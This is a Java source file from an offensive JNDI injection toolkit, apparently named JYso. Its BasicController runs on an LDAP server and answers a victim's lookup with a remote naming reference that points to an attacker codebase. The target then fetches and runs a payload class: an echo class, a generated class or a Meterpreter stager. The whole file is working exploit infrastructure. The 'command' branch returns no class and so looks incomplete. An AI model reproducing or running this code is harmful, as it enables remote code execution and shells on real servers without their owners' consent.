package com.qi4l.JYso.controllers;

import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.JYso.template.Meterpreter;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import java.net.URL;

import static org.fusesource.jansi.Ansi.ansi;

@SuppressWarnings("unused")
@LdapMapping(uri = {"/basic"})
public class BasicController extends BaseLdapController {

    private static final Logger log = LogManager.getLogger(BasicController.class);
    private static String payloadType;
    private final String codebase = Config.codeBase;
    private String[] params = new String[0];

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry entry = new Entry(base);
            String className = resolvePayloadClass();
            URL targetUrl = new URL(new URL(codebase), className.replace('.', '/') + ".class");

            System.out.println(ansi().fgBrightBlue().a("  redirecting to " + targetUrl).reset());
            entry.addAttribute("javaClassName", "foo");
            entry.addAttribute("javaCodeBase", codebase);
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaFactory", className);
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception er) {
            System.err.println("Error while generating or serializing payload");
            log.error("Error while generating or serializing payload", er);
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        ParseResult result = parseBase(base, "- JNDI Remote Reference Links ");
        payloadType = result.payloadType;
        params = result.params;
    }

    private String resolvePayloadClass() throws Exception {
        if (payloadType.contains("E-")) {
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(suffixAfterDash(payloadType)));
            return echoClass.getName();
        }

        if (payloadType.contains("M-")) {
            return Gadgets.createClassB(suffixAfterDash(payloadType));
        }

        if (payloadType.contains("command")) {
            if (params.length == 0) {
                throw new IncorrectParamsException("Missing command parameters.");
            }
        }

        if (payloadType.contains("msf")) {
            return Meterpreter.class.getName();
        }

        throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
    }
}
